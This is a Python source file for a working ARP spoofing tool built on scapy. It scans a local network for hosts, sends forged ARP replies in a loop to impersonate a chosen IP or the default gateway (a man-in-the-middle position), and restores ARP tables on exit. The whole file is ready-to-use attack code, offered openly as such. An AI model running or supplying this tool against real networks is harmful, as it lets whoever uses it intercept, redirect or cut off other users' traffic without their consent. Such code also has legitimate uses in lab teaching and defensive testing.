#!/usr/bin/python3
import argparse
from time import sleep
import os
from sys import stdout, exit
from psutil import net_if_addrs, LINUX, WINDOWS
from netifaces import gateways, AF_LINK, AF_INET
from ipaddress import IPv4Network
from multiprocessing import Process
from colorama import Fore
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp1, sendp
from scapy.config import conf

NET = {'broadcast_mac': 'ff:ff:ff:ff:ff:ff', 'timeout': 4}


class ARPoisoner:
    def __init__(self, spoofed_ip, target, interface):
        self.target = target
        self.spoofed_ip = spoofed_ip
        if self.get_mac(target):
            self.target_mac = self.get_mac(target)
        else:
            raise AttributeError(f"Target host {target} is unreachable")
        self.interface = interface
        self.interface_mac, self.gateway = self.get_interface_attributes(interface)
        self.gateway_mac = self.get_mac(self.gateway)
        self.poison_thread = Process()
        conf.iface = interface
        conf.verb = 0
        print(Fore.YELLOW + f'Initialized {interface}:')
        print(f'Gateway ({self.gateway}) is at {self.gateway_mac}')
        print(f'Target ({self.target}) is at {self.target_mac}')
        if self.spoofed_ip:
            print(f'Spoofed IP ({self.spoofed_ip}) is at {self.interface_mac}')

        print('-' * 30 + Fore.RESET)

    @staticmethod
    def get_interface_attributes(interface: str):
        """
            params: interface as a string
            return: interface MAC address as string, IP of default gateway as string
        """
        net_cards = [(iface, iface_attrib) for iface, iface_attrib in net_if_addrs().items()]
        gws = gateways()
        for iface, iface_attrib in net_cards:
            if iface == interface:
                try:
                    mac_address = [attrib.address for attrib in iface_attrib if attrib.family == AF_LINK][0]
                except IndexError:
                    mac_address = iface_attrib[0].address

                default_gateway = gws['default'][AF_INET][0]
                return mac_address.replace('-', ':').lower(), default_gateway

    @staticmethod
    def get_mac(target_ip):
        who_has_request = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=target_ip)
        target_mac = srp1(who_has_request, timeout=NET.get('timeout'), verbose=0)
        try:
            return target_mac.getlayer(Ether).src if target_mac.getlayer(Ether) else None
        except AttributeError:
            return None
    
    @staticmethod
    def scan_network(network_ip, netmask):
        network = IPv4Network(f"{network_ip}/{netmask}", strict=False)
        all_ips = list(network.hosts())
        print(Fore.YELLOW + "-" * 15 + " Scanning Network " + "-" * 15 + Fore.RESET)
        for ip in all_ips:
            mac = ARPoisoner.get_mac(ip.compressed)
            if mac:
                print(Fore.BLUE + f"IP: {ip}, MAC: {mac}")
        print(Fore.YELLOW + "-" * 15 + " Scan Complete " + "-" * 15 + Fore.RESET)

    def run(self):
        self.poison_thread = Process(target=self.poison).start()

    def poison(self, spoof_gateway, delay: int):
        source_is_at = Ether(src=self.interface_mac, dst=self.target_mac) / ARP(op='is-at', psrc=self.spoofed_ip,
                                                                                pdst=self.target)
        gateway_is_at = Ether(src=self.interface_mac, dst=self.target_mac) / ARP(op='is-at', psrc=self.gateway, pdst=self.target)
        target_is_at = Ether(src=self.interface_mac, dst=self.gateway_mac) / ARP(op='is-at', psrc=self.target, pdst=self.gateway)

        print(Fore.YELLOW + f'Starting ARP Spoofing attack at IP: {self.target} MAC: {self.target_mac}...')
        while True:
            stdout.write('.')
            stdout.flush()

            try:
                if spoof_gateway:
                    sendp(gateway_is_at)
                    sendp(target_is_at)
                else:
                    sendp(source_is_at)

            except KeyboardInterrupt:
                self.restore()
                exit()

            else:
                sleep(delay)

    def restore(self):
        print(Fore.GREEN + '\nRestoring ARP tables...\n')
        gateway_is_at = Ether(src=self.gateway_mac, dst=NET.get('broadcast_mac')) / ARP(op='is-at',psrc=self.gateway, pdst=self.target)
        target_is_at = Ether(src=self.target_mac, dst=NET.get('broadcast_mac')) / ARP(op='is-at', psrc=self.target, pdst=self.gateway)
        sendp(gateway_is_at, count=5)
        sendp(target_is_at, count=5)
        print('ARP Tables restored' + Fore.RESET)


def main():
    if LINUX and os.getuid() != 0:
        exit(Fore.RED + 'Run Program as root' + Fore.RESET)

    interfaces = 'eth0' if LINUX else 'WiFi'

    arguments = argparse.ArgumentParser()
    arguments.add_argument('-i', '--iface', type=str, default=interfaces, help=f'Choose which interface for the attack. Default is {interfaces}')
    arguments.add_argument('--scan', type=str, help='Scan  <IP>/netmask for all alive hosts in the given network to attack')
    arguments.add_argument('-s', '--src', type=str, help='IP address the attacker machine will become')
    arguments.add_argument('-t', '--target', type=str, help='IP address of the target machine')
    arguments.add_argument('-d', '--delay', type=int, default=0.1, help='Delay (in seconds) between messages. Default is 0.1')
    arguments.add_argument('-gw', '--gateway', default=False,  action='store_true', help='Spoof the gateway as well. Default is false')
    arguments = arguments.parse_args()
    
    try:
        if arguments.target and arguments.src or arguments.gateway:
            interface, spoofed_ip = arguments.iface, arguments.src
            target, delay = arguments.target, arguments.delay
            spoof_gateway = arguments.gateway
            poisoner = ARPoisoner(spoofed_ip, target, interface)
            poisoner.poison(spoof_gateway, delay)

        elif arguments.scan:
            network_ip, netmask = arguments.scan.split('/')
            ARPoisoner.scan_network(network_ip, netmask)

    except AttributeError:
        print(Fore.RED + f"Target host {target} is unreachable" + Fore.RESET)

    except KeyboardInterrupt:
        poisoner.restore()

    except TypeError:
        if arguments.target is None:
            print(Fore.RED + 'Choose a target to attack and a IP to spoof' + Fore.RESET)
        else:
            print(Fore.RED + 'Enter a <network IP>/<subnet mask> to scan the network!' + Fore.RESET)


if __name__ == '__main__':
    main()
